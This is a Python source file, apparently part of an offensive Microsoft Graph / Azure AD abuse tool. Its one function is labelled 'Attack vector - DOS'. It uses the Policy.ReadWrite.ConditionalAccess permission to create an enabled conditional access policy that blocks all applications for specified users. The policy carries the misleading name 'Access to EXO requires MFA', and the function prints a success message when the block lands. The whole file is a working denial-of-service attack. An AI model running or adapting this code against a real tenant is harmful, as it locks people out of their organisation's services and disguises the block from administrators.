import requests
import colorama
from colorama import Fore, Style


def Conditional_access_Vectors(request_headers, ConditionalAccessSettings):
    print()
    print(
        "Policy.ReadWrite.ConditionalAccess - Allows the app to read and write your organization's conditional access policies on behalf of the signed-in user.")

    print()
    print("needs Policy.Read.All, Policy.ReadWrite.ConditionalAccess and Application.Read.All")
    try:
        print("Attack vector - DOS")

        create_message_URL = "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies"
        message_obj = {
    "displayName": "Access to EXO requires MFA",
    "state": "enabled",
    "conditions": {
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "includeApplications": [
                "All"
            ]
        },
        "users": {
            "includeUsers": [ConditionalAccessSettings["users"]]
        }
    },
    "grantControls": {
        "operator": "AND",
        "builtInControls": [
            "block"
        ]
    }
}
        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        print(result.text)
        print(result.status_code)
        if result.status_code == 201:
            print(Fore.GREEN + "Added block on " + ConditionalAccessSettings["users"])
            print(Style.RESET_ALL)

    except:
        pass
